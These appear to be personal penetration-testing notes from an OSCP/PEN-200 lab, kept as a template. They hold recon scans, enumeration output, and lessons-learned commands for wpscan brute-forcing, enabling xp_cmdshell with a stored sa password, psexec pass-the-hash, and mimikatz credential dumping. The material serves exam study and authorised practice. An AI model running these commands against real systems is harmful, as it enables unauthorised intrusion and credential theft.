##### Machine Information
```markdown
IP ADDRESS: 192.168.118.114

HN:

OS: Windows 10.0 Build 19041 x64

EXPLOIT/PORT:

PRIVESC: 

USERS MENTIONED:

CREDENTIALS:
```

------------------------------------------------------------------------------------
###### Initial Scanning  
#ping
```shell
#ping 
┌──(root㉿kali)-[/home/kali]
└─# ping 10.11.1.101         

```
#rustscan 
```shell
┌──(root㉿kali)-[/home/kali]
└─# rustscan -a 10.11.1.101
```
#quick #nmap #for #rustscan
```shell
┌──(root㉿kali)-[/home/kali]
└─# nmap -sC -sV -p 21,22,80,139,445 -Pn 10.11.1.101
```
#nmapudp
```shell
┌──(root㉿kali)-[/home/kali]
└─# nmap -sU 10.11.1.101                            
```
#nmapfulltcp
```shell
┌──(root㉿kali)-[/home/kali/Documents/12apr_exam/192.168.118.114]
└─# nmap -sC -sV -p- -Pn 192.168.118.114
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-13 04:14 EDT
Stats: 0:02:53 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 88.89% done; ETC: 04:17 (0:00:15 remaining)
Stats: 0:03:25 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 94.44% done; ETC: 04:18 (0:00:09 remaining)
Nmap scan report for 192.168.118.114
Host is up (0.13s latency).
Not shown: 65517 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-07-22  03:49AM              5242368 minimouse.msi
|_02-07-22  04:20AM             10816785 WBCE_CMS-1.5.2.zip
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=oscp
| Not valid before: 2023-04-11T12:44:21
|_Not valid after:  2023-10-11T12:44:21
|_ssl-date: 2023-04-13T08:18:35+00:00; +2s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: OSCP
|   NetBIOS_Domain_Name: OSCP
|   NetBIOS_Computer_Name: OSCP
|   DNS_Domain_Name: oscp
|   DNS_Computer_Name: oscp
|   Product_Version: 10.0.19041
|_  System_Time: 2023-04-13T08:18:07+00:00
5040/tcp  open  unknown
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
8039/tcp  open  unknown
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404 OK
|     Server: bruce_wy/1.0.0
|     Access-Control-Allow-Methods: POST,GET,TRACE,OPTIONS
|     Access-Control-Allow-Headers: Content-Type,Origin,Accept
|     Access-Control-Allow-Origin: *
|     Access-Control-Allow-Credentials: true
|     P3P: CP=CAO PSA OUR
|     Content-Type: text/html
|     Content-Range: bytes 0-0/-1
|_    Content-Length : 4294967295
8080/tcp  open  http          Microsoft IIS httpd 10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: 401 - Unauthorized: Access is denied due to invalid credentials.
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8039-TCP:V=7.93%I=7%D=4/13%Time=6437BA25%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,14B,"HTTP/1\.1\x20404\x20OK\r\nServer:\x20bruce_wy/1\.0\.0\r\n
SF:Access-Control-Allow-Methods:\x20POST,GET,TRACE,OPTIONS\r\nAccess-Contr
SF:ol-Allow-Headers:\x20Content-Type,Origin,Accept\r\nAccess-Control-Allow
SF:-Origin:\x20\*\r\nAccess-Control-Allow-Credentials:\x20true\r\nP3P:\x20
SF:CP=CAO\x20PSA\x20OUR\r\nContent-Type:\x20text/html\r\nContent-Range:\x2
SF:0bytes\x200-0/-1\r\nContent-Length\x20:\x204294967295\r\n\r\n")%r(HTTPO
SF:ptions,14B,"HTTP/1\.1\x20404\x20OK\r\nServer:\x20bruce_wy/1\.0\.0\r\nAc
SF:cess-Control-Allow-Methods:\x20POST,GET,TRACE,OPTIONS\r\nAccess-Control
SF:-Allow-Headers:\x20Content-Type,Origin,Accept\r\nAccess-Control-Allow-O
SF:rigin:\x20\*\r\nAccess-Control-Allow-Credentials:\x20true\r\nP3P:\x20CP
SF:=CAO\x20PSA\x20OUR\r\nContent-Type:\x20text/html\r\nContent-Range:\x20b
SF:ytes\x200-0/-1\r\nContent-Length\x20:\x204294967295\r\n\r\n")%r(RTSPReq
SF:uest,14B,"HTTP/1\.1\x20404\x20OK\r\nServer:\x20bruce_wy/1\.0\.0\r\nAcce
SF:ss-Control-Allow-Methods:\x20POST,GET,TRACE,OPTIONS\r\nAccess-Control-A
SF:llow-Headers:\x20Content-Type,Origin,Accept\r\nAccess-Control-Allow-Ori
SF:gin:\x20\*\r\nAccess-Control-Allow-Credentials:\x20true\r\nP3P:\x20CP=C
SF:AO\x20PSA\x20OUR\r\nContent-Type:\x20text/html\r\nContent-Range:\x20byt
SF:es\x200-0/-1\r\nContent-Length\x20:\x204294967295\r\n\r\n")%r(FourOhFou
SF:rRequest,14B,"HTTP/1\.1\x20404\x20OK\r\nServer:\x20bruce_wy/1\.0\.0\r\n
SF:Access-Control-Allow-Methods:\x20POST,GET,TRACE,OPTIONS\r\nAccess-Contr
SF:ol-Allow-Headers:\x20Content-Type,Origin,Accept\r\nAccess-Control-Allow
SF:-Origin:\x20\*\r\nAccess-Control-Allow-Credentials:\x20true\r\nP3P:\x20
SF:CP=CAO\x20PSA\x20OUR\r\nContent-Type:\x20text/html\r\nContent-Range:\x2
SF:0bytes\x200-0/-1\r\nContent-Length\x20:\x204294967295\r\n\r\n")%r(SIPOp
SF:tions,14B,"HTTP/1\.1\x20404\x20OK\r\nServer:\x20bruce_wy/1\.0\.0\r\nAcc
SF:ess-Control-Allow-Methods:\x20POST,GET,TRACE,OPTIONS\r\nAccess-Control-
SF:Allow-Headers:\x20Content-Type,Origin,Accept\r\nAccess-Control-Allow-Or
SF:igin:\x20\*\r\nAccess-Control-Allow-Credentials:\x20true\r\nP3P:\x20CP=
SF:CAO\x20PSA\x20OUR\r\nContent-Type:\x20text/html\r\nContent-Range:\x20by
SF:tes\x200-0/-1\r\nContent-Length\x20:\x204294967295\r\n\r\n");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
| smb2-time: 
|   date: 2023-04-13T08:18:08
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 240.09 seconds

```
##### Initial Scanning Notes:
#initial #scanning #notes
- NOTES
- NOTES
- NOTES
  
##### Searchsploit Notes:
#searchsploit
- NOTES
- NOTES
- NOTES

##### Web Fuzzing : Dirsearch // GoBuster // ffuf // nikto
#gobuster #/usr/share/dirb/wordlists/common
```shell
┌──(root㉿kali)-[/home/kali]
└─# gobuster dir -u http://10.11.1.101:80 -w /usr/share/dirb/wordlists/common.txt -x php,txt,html,asp,aspx
```
#gobuster #bruteforce
```

gobuster dir -u http://192.168.111.110 -w
/usr/share/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt -t 250 -o
wordpress_gobuster
```
#dirsearch #/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```shell
#dirsearch medium.txt
┌──(root㉿kali)-[/home/kali]
└─# dirsearch -u http://10.11.1.101:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```shell
# tcm recommended dirsearch
┌──(root㉿kali)-[/home/kali]
└─# dirsearch -e php,html,js,asp,aspx -u http://10.11.1.234:10443 -x 400,401,403 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

#nikto #-a
```shell
┌──(root㉿kali)-[/home/kali]
└─# nikto -host 10.11.1.101:80  
```

#basic #ffuf
```shell
# basic ffuf scan - hail mary if nothing is found.
┌──(root㉿kali)-[/home/kali]
└─# ffuf -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -u https://10.11.1.237/FUZZ
```

#wpscan #wordpress #plugin #reverse #shell #bruteforce #admin/princess #credentials
```shell
# Basic wpscan
┌──(root㉿kali)-[/home/kali]
└─# wpscan --url http://10.11.1.234:80

# WPscan bruteforce - reference 10.11.1.234 
┌──(root㉿kali)-[/home/kali]
└─# wpscan --url http://10.11.1.234:80/ --enumerate u,p,t -P rockyou.txt
```

Fuzzing notes:
- make sure if having issues to fuzzing to use all wordlists on kali machina and download seclists worst case scenario

##### Reverse Shell / Shell 

```shell
```

##### Foothold Enumeration Linux
#sudo #failed 
```shell
alfred@break:~/usr/bin$ sudo -l
[sudo] password for alfred: 
Sorry, user alfred may not run sudo on break.
alfred@break:~/usr/bin$ 
```
#cat #/etc/crontab
```shell
alfred@break:~/usr/bin$ cat /etc/crontab
# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly 
```
#uname #-a #kernelprivesc
```shell
alfred@break:~$ uname -a
Linux break 4.4.0-166-generic #195-Ubuntu SMP Tue Oct 1 09:35:25 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```
#cat #/etc*/release
```shell
alfred@break:~$ cat /etc/*release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.6 LTS"
NAME="Ubuntu"
VERSION="16.04.6 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.6 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial
```
#lsb_release #-a 
```shell
alfred@break:~$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 16.04.6 LTS
Release:	16.04
Codename:	xenial
alfred@break:~$ 
```
#transfered #linpeas
```shell
┌──(root㉿kali)-[/home/kali/Documents/offsec_labs_pen200/10.11.1.101]
└─# ls               
linpeas.sh
                                                                          
┌──(root㉿kali)-[/home/kali/Documents/offsec_labs_pen200/10.11.1.101]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.11.1.101 - - [31/Mar/2023 19:51:13] "GET /linpeas.sh HTTP/1.1" 200 -

# pulled over linpeas
alfred@break:/tmp$ wget http://192.168.119.132/linpeas.sh
linpeas.sh                    100%[==============================================>] 808.68K  1.30MB/s    in 0.6s 
```
##### Foothold Enumeration Windows

```SHELL
```
##### Privilege Escalation
```shell
```

##### Flag
```powershell
```


###### Lessons Learned:


#ssh #portforwarding
```

In order to access the internal VNC port 5901, an SSH tunnel will need to be established
that will forward traffic from 5901 on Kali to the internal 5901 on the victim.
ssh -R 5901:127.0.0.1:5901 kali@192.168.11.11
```

#phpinfo

```shell
phpinfo.php is a file that contains a lot of information that can help attackers
when trying to target a system, such as: database information, host information, and software
version numbers.
```

#mssqlclient.py
```shell
# connecting with credentials
mssqlclient.py -port 1433 sa:D@t@b@535@192.168.132.1


#Enabling xp_cmdshell successfully allows system command execution in mssql
EXEC sp_configure ‘show advanced options’, ‘1’
RECONFIGURE
EXEC sp_configure ‘xp_cmdshell’, ‘1’
RECONFIGURE
EXEC xp_cmdshell ‘net user’;
```

#psexec #mimikatz

```shell
# generic psexec login with psexec
psexec.py <user> @127.0.0.1 -hashes :NTLM_HASH_HERE

# how to upload files or mimikatz using psexec
lput mimikatz.exe

#mimikatz dumping of credentials
mimikatz.exe privilege::debug sekurlsa::logonpasswords
```